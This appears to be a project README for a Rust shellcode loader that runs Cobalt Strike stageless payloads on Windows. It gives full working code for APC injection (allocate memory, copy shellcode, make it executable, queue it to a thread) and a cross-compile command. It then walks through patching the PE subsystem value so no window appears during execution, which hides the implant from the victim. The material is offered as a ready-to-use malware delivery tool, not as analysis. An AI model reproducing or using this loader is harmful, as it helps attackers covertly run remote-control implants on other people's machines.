# 🔥 Rust Reverse Shell for cobalt strike.

---

## 🚀 Project overview

1. **First create a raw payload in cobalt strike.**
2. **Extract shellcode using python**
3. **Rust Shellcode runner**
4. **Cross compilation.**
5. **Execution.**

---

- **First create a raw payload in cobalt strike.**

   Create a stageless shellcode using cobalt strike in raw format.


- **Extract shellcode using python**
   use ```rust-shellcode-extract.py``` file to extract shellcode from .bin file.


---
## 🛡️ **Rust shellcode runner.**
  
This Rust code demonstrates APC (Asynchronous Procedure Call) injection - a technique used to execute shellcode in a remote thread.

### 🏗️ How This APC Injection Works:

- Create Suspended Thread: Creates a thread that starts suspended

- Allocate Memory: Reserves RW memory for shellcode

- Copy Shellcode: Transfers shellcode bytes to allocated memory

- Change Permissions: Switches memory from RW to RX for execution

- Queue APC: Schedules shellcode as Asynchronous Procedure Call

- Execute: Resumes thread, which executes the queued APC


```rust
use std::{
    ffi::c_void,
    ptr::copy_nonoverlapping,
};
use windows::core::Result;
use windows::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, 
    MEM_RESERVE, PAGE_EXECUTE_READ,
    PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
};
use windows::Win32::System::Threading::{
    CreateThread, QueueUserAPC, ResumeThread, SleepEx, 
    WaitForSingleObject, INFINITE, THREAD_CREATION_FLAGS,
};

fn main() -> Result<()> {
    let buf: &[u8] = &[SHELLCODE_HERE];


    unsafe {
        // Create a suspended thread that will be used to execute the payload.
        let hthread = CreateThread(
            None,
            0,
            Some(function),
            None,
            THREAD_CREATION_FLAGS(0),
            None,
        )?;

        // Allocate RW memory to hold the shellcode
        let address = VirtualAlloc(None, buf.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        // Copy the shellcode into the allocated memory
        copy_nonoverlapping(buf.as_ptr().cast(), address, buf.len());

        // Change memory permissions to RX so the shellcode can be executed
        let mut oldprotect = PAGE_PROTECTION_FLAGS(0);
        VirtualProtect(address, buf.len(), PAGE_EXECUTE_READ, &mut oldprotect)?;

        // Queue the shellcode for execution as an APC in the thread's context.
        QueueUserAPC(Some(std::mem::transmute(address)), hthread, 0);

        // Resume the thread, which will execute the shellcode via the queued APC.
        ResumeThread(hthread);
        WaitForSingleObject(hthread, INFINITE);
    }

    Ok(())
}

/// Dummy thread entry function that blocks on `SleepEx`, waiting for an APC to trigger.
unsafe extern "system" fn function(_param: *mut c_void) -> u32 {
    SleepEx(INFINITE, true);
    return 0;
}
```

---

## Cross Compilation

```bash
cargo build --target x86_64-pc-windows-gnu --release
```

---

## Execution 

### ```Here you can see a windows GUI is opening while executing the exe. We don't want that let's fix it```


<img width="1184" height="623" alt="Screenshot 2025-11-07 at 11 43 10 AM" src="https://github.com/user-attachments/assets/a1090306-73e9-4b09-8258-bcd76df90b24" />

### DIE Detect it easy

- #### Open the binary in die.

<div align=center />

<img width="799" height="529" alt="Screenshot 2025-11-07 at 12 15 23 PM" src="https://github.com/user-attachments/assets/a461f220-3372-4954-ae3f-fb282088670d" />

---
<div align=left />

#### go to PE --> IMAGE_NT_HEADERS --> IMAGE_OPTIONAL_HEADER | MAKE SURE TO UNCHECK ReadOnly on top right.

---

<img width="1348" height="513" alt="Screenshot 2025-11-07 at 12 16 58 PM" src="https://github.com/user-attachments/assets/be9f9711-ec0c-469d-a786-d6a60af92a50" />

---

#### Change ```Subsystem``` Value initially it was 0003 make it 0002. That's it windows gui is gone............................

---





